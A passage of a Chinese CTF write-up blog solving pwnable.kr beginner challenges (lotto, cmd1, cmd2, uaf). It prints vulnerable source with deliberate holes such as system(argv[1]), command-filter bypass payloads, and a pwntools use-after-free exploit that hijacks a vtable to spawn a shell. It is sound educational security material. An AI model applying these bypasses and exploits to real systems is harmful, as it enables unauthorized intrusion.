class="type">unsigned</span> <span class="type">char</span> lotto[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">        lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;        <span class="comment">// 1 ~ 45</span></span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// calculate lotto score</span></span><br><span class="line">    <span class="type">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">                match++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// win!</span></span><br><span class="line">    <span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad luck...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">help</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;- nLotto Rule -\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your goal is to match lotto numbers as many as you can\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;if you win lottery for *1st place*, you will get reward\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;for more details, follow the link below\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// menu</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> menu;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;- Select Menu -\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1. Play Lotto\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2. Help\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(menu)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                play();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                help();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;invalid menu\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是一个被称为 lotto 的游戏，也就是猜数字，说白了就是刮彩票，程序会通过 <code>/dev/urandom</code> 生成 6 个 1-45 之间的随机数，我们需要输入 6 个数字，保证我们输入的 6 个数字在生成的 6 个随机数中只出现一次，我们就赢了，所以最后的这两层循环就变得容易了起来，我们可以只输入 6 个相同的数字，只要这个数字命中了随机数中的任意一个，最后 match 的结果有很大的可能性是 6，例如一直输入六个字符<code>-</code>，也就是数字 45，只尝试了 4 次就成功了。</p><h1 id="cmd1-1-pt"><a href="#cmd1-1-pt" class="headerlink" title="cmd1 (1 pt)"></a>cmd1 (1 pt)</h1><p>非常简单的一道题，直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">filter</span><span class="params">(<span class="type">char</span>* cmd)</span>&#123;</span><br><span class="line">    <span class="type">int</span> r=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;sh&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;tmp&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>** envp)</span>&#123;</span><br><span class="line">    putenv(<span class="string">&quot;PATH=/thankyouverymuch&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    system(argv[<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接给了一个 shell，但是去除了 PATH 环境变量，并且输入的 command 中不能出现 flag，sh，tmp 这些字符串。去除了环境变量我们就可以用 cat 的绝对路径，不能出现 flag 可以用通配符代替，最后的 payload 如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cmd1 <span class="string">&quot;/bin/cat ./fl*&quot;</span></span><br></pre></td></tr></table></figure><h1 id="cmd2-9-pt"><a href="#cmd2-9-pt" class="headerlink" title="cmd2 (9 pt)"></a>cmd2 (9 pt)</h1><p>和上一题类似，直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">filter</span><span class="params">(<span class="type">char</span>* cmd)</span>&#123;</span><br><span class="line">    <span class="type">int</span> r=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;=&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;PATH&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;export&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;/&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;`&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_env</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>** p;</span><br><span class="line">    <span class="keyword">for</span>(p=environ; *p; p++)    <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>** envp)</span>&#123;</span><br><span class="line">    delete_env();</span><br><span class="line">    putenv(<span class="string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    system(argv[<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目增加了更多的限制，并且删除了所有环节变量。最大的限制就是不能出现路径分隔符，因此无法用绝对路径来使用 cat，但是可以用 shell 变量来造一个路径分隔符，例如 <code>echo $(pwd)</code>，如果此时位于根目录的时候，<code>$(pwd)</code> 就会返回<code>/</code>，所以可以利用这个 payload 构造一个路径分隔符。</p><p>最后在 bash 里输入如下 payload，需要注意的是 <code>$(pwd)</code> 需要被传到 system 里，因此在 bash 里需要加上转义，否则在执行 cmd2 之前 <code>$(pwd)</code> 就会被 bash 解析为<code>/</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">~/cmd2 <span class="string">&quot;\$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)fla*&quot;</span></span><br></pre></td></tr></table></figure><h1 id="uaf-8-pt"><a href="#uaf-8-pt" class="headerlink" title="uaf (8 pt)"></a>uaf (8 pt)</h1><p>直接给了源码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Human</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    string name;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;My name is &quot;</span> &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;I am &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Man</span>: <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Man</span>(string name, <span class="type">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Human::<span class="built_in">introduce</span>();</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;I am a nice guy!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Woman</span>: <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Woman</span>(string name, <span class="type">int</span> age)&#123;</span><br><span class="line">            <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">            <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Human::<span class="built_in">introduce</span>();</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;I am a cute girl!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    Human* m = <span class="keyword">new</span> <span class="built_in">Man</span>(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">    Human* w = <span class="keyword">new</span> <span class="built_in">Woman</span>(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> op;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;1. use\n2. after\n3. free\n&quot;</span>;</span><br><span class="line">        cin &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                m-&gt;<span class="built_in">introduce</span>();</span><br><span class="line">                w-&gt;<span class="built_in">introduce</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                len = <span class="built_in">atoi</span>(argv[<span class="number">1</span>]);</span><br><span class="line">                data = <span class="keyword">new</span> <span class="type">char</span>[len];</span><br><span class="line">                <span class="built_in">read</span>(<span class="built_in">open</span>(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; endl;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">delete</span> m;</span><br><span class="line">                <span class="keyword">delete</span> w;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是一个很简单的 uaf，但是因为是 c++ 所以比较麻烦，不过利用起来还是挺简单的。Human 类直接给了一个虚函数，里面就是一个 shell，那么直接跳到这个虚表就可以了，通过 gdb 或者 ida 都可以查到这个虚函数在虚表中的位置为<em>0x</em>401570。</p><p>在 main 的主循环中一共有 3 个功能，use，after 和 free，use 则调用 Man 类和 Woman 类的 intriduce 函数，这个函数刚好就在 get_shell+8 的位置，如下所示。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/12.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/13.png"></p><p>free 则是将最开始 new 的 Man 和 Woman 都 free 掉，而 after 则是从一个文件中读取一定数量的字符写入，文件名和读取的数量由 argv 决定，这里并没有溢出，为了测试方便，我们先假设 argv[2]为 <code>/dev/stdin</code>，直接从标准输入读取，后面再探讨 argv[1] 的大小应该为多少合适。main 函数中首先 new 了个 Man 和 Woman，这时候我们看一下堆里面是什么样子。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/10.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/11.png"></p><p>可以看到 Man 和 Woman 一共 malloc 出了 4 个 chunk，每个类各两个，一个 0x30 大小的和一个 0x20 大小的 chunk，之所以每个类都 malloc 出两个大小，是因为 Human 中的 name 为 string 类型，在创建 string 类型之前需要 malloc 一个 chunk 出来保存字符串，所以那个 0x30 大小的 chunk 保存的是 name 中的字符串，也就是 string 类，而 0x20 大小的 chunk 中保存了 age 以及类的虚表指针，其中的 0x401570 以及 0x401550 就是这两个类对应的虚表。</p><p>题目名称是 uaf，那我们先 free 掉这 4 个 chunk 看看堆里是什么样子。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/14.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/15.png"></p><p>可以看到这 4 个 chunk 都进了 tcache，并且虚表指针也被破坏了，但是题目重点就在于 uaf，因此在 free 以后，m 和 w 变量依旧指向的是堆上那两个 chunk，在调用 introduce 的时候还是会根据 chunk 中的虚表指针跳转，那么如果我们可以想办法修改那两个 0x20 的 chunk 中的虚表指针，我们再次 use，调用 introduce 的时候就可以控制跳转的地址了。</p><p>现在我们的目标 chunk 也就是 0x20 大小的 chunk 位于 tcache 中，处于 free 状态，而通过 after 功能我们可以 malloc 一个自定大小的 chunk，那么我们如果刚好可以从 tcache 中 malloc 出来那个 0x20 的目标 chunk，那么我们就可以控制 chunk 的内容，也就是虚表指针的地址，修改这个地址为 get_shell-8 的地址，那么调用 introduce 的时候在加 8，刚好就可以跳转到 get_shell 的地址。最终的 exp 如下，需要在 tmp 中新建一个目录写入 exp，然后执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9007</span></span><br><span class="line"></span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;/home/uaf/uaf&quot;</span>)</span><br><span class="line"><span class="comment"># pg = cyclic_gen()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(env=env, argv=[elf.path, <span class="built_in">str</span>(<span class="number">0x10</span>), <span class="string">&#x27;/dev/stdin&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">use</span>():</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">data</span>):</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    conn.send(data)</span><br><span class="line">    <span class="built_in">print</span>(conn.recvline())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">after(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">after(p64(<span class="number">0x401570</span>-<span class="number">8</span>) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>&gt;&gt;<span class="number">1</span>))</span><br><span class="line">use()</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="memcpy-10-pt"><a href="#memcpy-10-pt" class="headerlink" title="memcpy (10 pt)"></a>memcpy (10 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 